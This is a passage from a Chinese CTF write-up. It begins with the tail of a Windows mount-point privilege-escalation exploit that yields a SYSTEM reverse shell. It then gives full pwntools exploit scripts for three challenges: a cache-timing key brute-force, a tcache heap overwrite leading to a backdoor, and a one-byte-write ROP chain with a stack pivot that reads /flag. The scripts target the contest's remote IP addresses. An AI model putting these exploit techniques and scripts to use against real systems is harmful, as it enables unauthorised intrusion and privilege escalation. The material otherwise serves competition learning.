        CloseHandle(pi.hThread);
        return 0;
    }
> 参考：
>
> [一步步学写Windows下的Shellcode – 安全客，安全资讯平台
> (anquanke.com)](https://www.anquanke.com/post/id/195498#h3-10)
在编译时需要调整一些项目配置参数，反弹shell的io还有些问题，但是可以看到已经成功成为system权限
    C:\Users\Attacker\Desktop\CreateMountPoint.exe C:\Users\Public\tmp\X1ng C:\Users\Public\tmp1 C:\Users\Public\tmp\X1ng\vul_service.exe C:\Users\Attacker\Desktop\a.exe
## slow spn
程序从flag.txt中读取6个字符的key和4个字符的plaintext，然后8次通过s盒或p盒的变换后放进模拟的cache中
cache的逻辑是可以多次模拟访问s盒中的地址，如果cache命中了该地址则使用最近最久未使用算法计数，未命中则sleep(1)模拟读取内存的情况
由于有一次访问plaintext在s盒中的地址的机会，所以可以先通过去访问一个地址的方式将一个地址填入cache，然后访问plaintext，通过延时判断cache是否命中，进而猜测plaintext的地址是否为正在cache中的地址，得到p=0x10a4
同样的方法爆破上图中v9=0x4924、v7=0x78c、v5=0x9d44，实际操作的时候得到
    p=0x10a4
    k>>8=0x754
    k>>4=0x655e
    k=0xace7
由于cache是通过5-10bit的line和10bit以上的tag来标记的，所以爆破得到的结果可能有偏差，根据题目提示不用得到很准确的数字，所以将key进行拼接key=0x754e7，连接靶机后输入key和plaintext拿到flag  
PS：在实际操作的时候通过分成每组0x20个数据来确定范围，再修改exp爆破0x20个数据中p的值
exp：
    def exp(times):
        local=1
        binary_name='slowspn'
        if local:
            p=process("./"+binary_name)
            e=ELF("./"+binary_name)
        else:
            p=remote('124.71.173.176', 9999)
            e=ELF("./"+binary_name)
        def z(a=''):
            if local:
                gdb.attach(p,a)
                if a=='':
                    raw_input
            else:
                pass
        ru=lambda x:p.recvuntil(x)
        rc=lambda x:p.recv(x)
        sl=lambda x:p.sendline(x)
        sd=lambda x:p.send(x)
        sla=lambda a,b:p.sendlineafter(a,b)
        ia=lambda : p.interactive()
        def add(addr,sp):
            ru("What to do?\n")
            sl('1')
            ru("Where?\n")
            sl(str(addr))
            sla('Speed up?',str(sp))
        def test_flag():
            sla('What to do?',str(2))
        def nex():
            sla('What to do?',str(3))
        def nofound():
            sl(str(3))
        for j in range(0x20):
            add(0x645110+j*4+times*4,1)
            print(hex(times+j)+': '+hex(ss_box[times+j]))
        #nex()
        #nex()
        #nex()
        #nex()
        #nex()
        #nex()
        #通过控制nex的个数调整爆破哪一个变量
        test_flag()
        time_start=time.time()
        ru('What to do?')
        time_end=time.time()
        print(time_end-time_start)
        if round(time_end-time_start) != 1:
            print('YES')
            ia()
        else :
            print('NO')
            for i in range(7):
                sl('2')
            p.close()
    len_ss_box=65535
    for i in range(0,len_ss_box,0x20):
        exp(i)
连接.py:
    from pwn import *
    sh=remote("124.71.173.176","8888")
    from pwnlib.util.iters import mbruteforce
    from hashlib import sha256
    def proof_of_work(sh):
        sh.recvuntil('x + "')
        suffix = sh.recvuntil('"').decode("utf8")[:-1]
        print(suffix)
        #log.success(suffix)
        sh.recvuntil('== "')
        cipher = sh.recvuntil('"').decode("utf8")[:-1]
        print(cipher)
        proof = mbruteforce(lambda x: sha256((x + suffix).encode()).hexdigest()[:6] ==  cipher, string.ascii_letters + string.digits, length=4, method='fixed')
        sh.sendlineafter("Input x:\n", proof)
    proof_of_work(sh)
    sh.interactive()
## spn
可以直接溢出，但是输入的东西会被加密，网上找个解密脚本算一下，算出加密之后是shell地址就行。tcache打shell，进后门。
    #!/usr/bin/python
    # -*- coding:utf-8 -*-    
    from pwn import *
    import sys
    context.log_level = 'debug'
    context.arch='amd64'
    local=0
    binary_name='SPN_ENC'
    libc_name='lib/libc-2.27.so'
    if local:
        p=process("./"+binary_name)
        libc=ELF("./"+libc_name)
    else:
        p=remote('124.71.194.126',9999)
        e=ELF("./"+binary_name)
        libc=ELF("./"+libc_name)
    def z(a=''):
        if local:
            gdb.attach(p,a)
            if a=='':
                raw_input
        else:
            pass
    ru=lambda x:p.recvuntil(x)
    sl=lambda x:p.sendline(x)
    sd=lambda x:p.send(x)
    sa=lambda a,b:p.sendafter(a,b)
    sla=lambda a,b:p.sendlineafter(a,b)
    ia=lambda :p.interactive()
    def leak_address():
        if(context.arch=='i386'):
            return u32(p.recv(4))
        else :
            return u64(p.recv(6).ljust(8,b'\x00'))
    def cho(num):
        sla("0.exit\n",str(num))
    def add(size,idx):
        cho(1)
        sla("Size:",str(size))
        sla("Index:",str(idx))
    def delete(idx):
        cho(3)
        sla("Index:",str(idx))
    def show(idx):
        cho(4)
        sla("Index:",str(idx))
    def edit(idx,size,data):
        cho(2)
        sla("Index:",str(idx))
        sla("Size",str(size))
        sa("Content",data)
    def backdoor():
        cho(5)
    def decrypt(x):
        io = process('./spn_dec.py')
        io.sendline(str(x&0xffff))
        a = int(io.recv()[:-1])
        io.close()
        return a
    def spn_dec(x):
        a1 = decrypt(x)
        a2 = decrypt(x>>16)
        a3 = decrypt(x>>32)
        aa = a1+a2*0x10000+a3*0x100000000
        print(hex(a3),hex(a2),hex(a1))
        print(aa)
        return aa
    ru("gift:")
    shell_addr=int(ru('\n'),16)
    print(hex(shell_addr))
    aa = spn_dec(shell_addr)
    print(hex(aa))
    add(0x10,0)
    add(0x10,1)
    add(0x10,2)
    delete(2)
    delete(1)
    edit(0,0x26,b'a'*0x20+p64(aa)[:-2])
    add(0x10,3)
    add(0x10,4)
    edit(4,2,b'aa')
    backdoor()
    ia()
    # spn_dec.py是github上找的一个实现，改了一下io就用了。
## checkin
任意地址写一个字节，改了`_ZN14__interception21real___isoc99_vfscanfE`
的第二个字节，使其指向gets函数，返回调用gets函数，读取rop，泄露，栈迁移，orw。
    #!/usr/bin/python
    from pwn import *
    import sys
    context.log_level = 'debug'
    context.arch='amd64'
    local=1
    binary_name='checkin'
    libc_name='libc-2.27.so'
    libc=ELF("./"+libc_name)
    def pwn():
        def z(a=''):
            if local:
                gdb.attach(p,a)
                if a=='':
                    raw_input
            else:
                pass
        ru=lambda x:p.recvuntil(x)
        sl=lambda x:p.sendline(x)
        sd=lambda x:p.send(x)
        sa=lambda a,b:p.sendafter(a,b)
        sla=lambda a,b:p.sendlineafter(a,b)
        ia=lambda :p.interactive()
        def leak_address():
            if(context.arch=='i386'):
                return u32(p.recv(4))
            else :
                return u64(p.recv(6).ljust(8,b'\x00'))
        p=remote('123.60.97.201',9999)
        sla(b'Welcome! A gift for you:',str(0x73edb8+1))
        sleep(1)
        sd(b'\x91')
        sa(b'Leave a note.',b'a'*0x1f)
        sa(b"That's all. Have fun!",p64(0x43FBB3))
        pop_rdi = 0x41af0b
        pop_rsp = 0x484d50
        call_puts = 0x43A286
        rop = p64(pop_rdi)+p64(0x72DE30)+p64(call_puts)+b'a'*0x838+p64(0)*6+p64(pop_rdi)+p64(0xA00000)+p64(0x43FBB3)+b'a'*0x30+p64(0)*3+p64(pop_rsp)+p64(0xA00000)
        try:
            p.recv()
            sl(rop)
            libc_addr = leak_address()-0x407e0
            print(hex(libc_addr))
            if libc_addr == 0x736572605c61:
                p.close()
                return 0
        except Exception:
            return 0
        print(hex(libc_addr))
        binsh=libc_addr+0x1B3E1A
        system=libc_addr+0x4f550
        pop_rsi=0x000000000041ab7c
        pop_rdx=0x000000000043ced2
        open_addr=libc_addr+libc.sym['open']
        read_addr=libc_addr+libc.sym['read']
        write_addr=libc_addr+libc.sym['write']
        rop2 = p64(pop_rdi)+p64(0xA00100)+p64(pop_rsi)+p64(0)+p64(open_addr)
        rop2 += p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0xA00200)+p64(pop_rdx)+p64(0x100)+p64(read_addr)
        rop2 += p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0xA00200)+p64(pop_rdx)+p64(0x100)+p64(write_addr)
        rop2 = rop2.ljust(0x100,b'\x00')+b'/flag\x00'
        sl(rop2)
        ia()
    for i in range(0x100):
        pwn()